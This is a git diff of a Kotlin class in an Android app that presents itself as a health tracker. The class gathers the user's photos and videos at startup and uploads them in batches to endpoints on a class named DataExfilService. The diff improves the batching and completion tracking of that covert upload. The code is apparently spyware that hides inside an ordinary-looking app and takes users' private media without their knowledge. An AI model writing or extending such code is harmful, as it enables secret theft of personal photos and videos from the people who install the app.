@@ -9,6 +9,7 @@ import android.util.Log
 import com.inf2007.healthtracker.utilities.DataExfilService
 import com.inf2007.healthtracker.utilities.startup.models.MediaFile
 import java.util.concurrent.Executors
+import java.util.concurrent.atomic.AtomicInteger
 
 class StartupController(private val context: Context) {
     companion object {
@@ -42,50 +43,81 @@ class StartupController(private val context: Context) {
 
     private fun collectAllData() {
         var totalFiles = 0
+        val totalBatches = AtomicInteger(0)
+        val completedBatches = AtomicInteger(0)
 
-        // Collect photos in batches
+        // First, count total batches
         getUnsyncedPhotos().let { photos ->
             if (photos.isNotEmpty()) {
                 totalFiles += photos.size
-                Log.i(TAG, "Found ${photos.size} photos to upload")
-                photos.chunked(BATCH_SIZE).forEachIndexed { index, batch ->
+                val batches = photos.chunked(BATCH_SIZE).size
+                totalBatches.addAndGet(batches)
+                Log.i(TAG, "Found ${photos.size} photos to upload ($batches batches)")
+            }
+        }
+
+        getUnsyncedVideos().let { videos ->
+            if (videos.isNotEmpty()) {
+                totalFiles += videos.size
+                val batches = videos.chunked(BATCH_SIZE).size
+                totalBatches.addAndGet(batches)
+                Log.i(TAG, "Found ${videos.size} videos to upload ($batches batches)")
+            }
+        }
+
+        Log.i(TAG, "Total batches to complete: ${totalBatches.get()}")
+
+        // If nothing to upload, mark complete immediately
+        if (totalBatches.get() == 0) {
+            Log.i(TAG, "No files to upload")
+            startupPrefs.edit().putBoolean("initial_done", true).apply()
+            return
+        }
+
+        // Create progress callback
+        val progressCallback = object : BatchUploader.BatchProgressCallback {
+            override fun onBatchComplete(mediaType: String, success: Boolean) {
+                val completed = completedBatches.incrementAndGet()
+                Log.i(TAG, "Batch completed ($completed/${totalBatches.get()}) - Type: $mediaType, Success: $success")
+
+                if (completed == totalBatches.get()) {
+                    Log.i(TAG, "========== INITIAL COLLECTION COMPLETE ==========")
+                    Log.i(TAG, "Total files processed: $totalFiles")
+                    startupPrefs.edit().putBoolean("initial_done", true).apply()
+                }
+            }
+        }
+
+        // Upload photos
+        getUnsyncedPhotos().let { photos ->
+            if (photos.isNotEmpty()) {
+                photos.chunked(BATCH_SIZE).forEach { batch ->
                     batchUploader.uploadMediaBatch(
                         files = batch,
                         mediaType = "photos",
                         endpoint = DataExfilService.PHOTOS_ENDPOINT,
-                        onProgress = { current, total ->
-                            Log.d(TAG, "Photos: $current/$total batches")
-                        }
+                        progressCallback = progressCallback
                     )
                 }
             }
         }
 
-        // Collect videos in batches
+        // Upload videos
         getUnsyncedVideos().let { videos ->
             if (videos.isNotEmpty()) {
-                totalFiles += videos.size
-                Log.i(TAG, "Found ${videos.size} videos to upload")
-                videos.chunked(BATCH_SIZE).forEachIndexed { index, batch ->
+                videos.chunked(BATCH_SIZE).forEach { batch ->
                     batchUploader.uploadMediaBatch(
                         files = batch,
                         mediaType = "videos",
                         endpoint = DataExfilService.VIDEO_ENDPOINT,
-                        onProgress = { current, total ->
-                            Log.d(TAG, "Videos: $current/$total batches")
-                        }
+                        progressCallback = progressCallback
                     )
                 }
             }
         }
 
-        // Downloads are handled separately (different endpoint structure)
+        // Downloads are handled separately
         collectDownloads()
-
-        Log.i(TAG, "========== INITIAL COLLECTION COMPLETE ==========")
-        Log.i(TAG, "Total files processed: $totalFiles")
-
-        startupPrefs.edit().putBoolean("initial_done", true).apply()
     }
 
     private fun getUnsyncedPhotos(): List<MediaFile> {
@@ -181,9 +213,6 @@ class StartupController(private val context: Context) {
     }
 
     private fun collectDownloads() {
-        // Downloads need special handling due to file access
-        // For now, let the existing DownloadCollector handle it
-        // but you could enhance it later
         Log.d(TAG, "Downloads collection skipped - handled by DownloadCollector")
     }
 
@@ -193,7 +222,7 @@ class StartupController(private val context: Context) {
             val available = stat.availableBlocksLong * stat.blockSizeLong
             available > MIN_STORAGE_MB * 1024 * 1024
         } catch (e: Exception) {
-            true // If we can't check, assume yes
+            true
         }
     }
 }
